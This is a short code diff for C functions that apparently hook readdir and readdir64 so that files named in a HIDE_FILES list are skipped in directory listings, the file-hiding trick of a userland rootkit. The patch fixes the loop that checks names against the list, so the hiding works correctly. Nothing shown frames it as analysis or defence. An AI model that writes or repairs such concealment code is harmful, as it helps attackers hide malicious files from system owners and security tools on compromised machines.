@@ -111,7 +111,8 @@ struct dirent64* readdir64(DIR* dirp)
         }
 
         // other directories
-        for (int i = 0; i < sizeof(HIDE_FILES); i++) {
+        int i;
+        for (i = 0; i < sizeof(HIDE_FILES) / sizeof(HIDE_FILES[0]); i++) {
             if (strcmp(result->d_name, HIDE_FILES[i]) == 0) {
                 closedir(proc_1);
                 return temp;
@@ -154,7 +155,8 @@ struct dirent* readdir(DIR* dirp)
         }
 
         // other directories
-        for (int i = 0; i < sizeof(HIDE_FILES); i++) {
+        int i;
+        for (i = 0; i < sizeof(HIDE_FILES) / sizeof(HIDE_FILES[0]); i++) {
             if (strcmp(result->d_name, HIDE_FILES[i]) == 0) {
                 closedir(proc_1);
                 return temp;
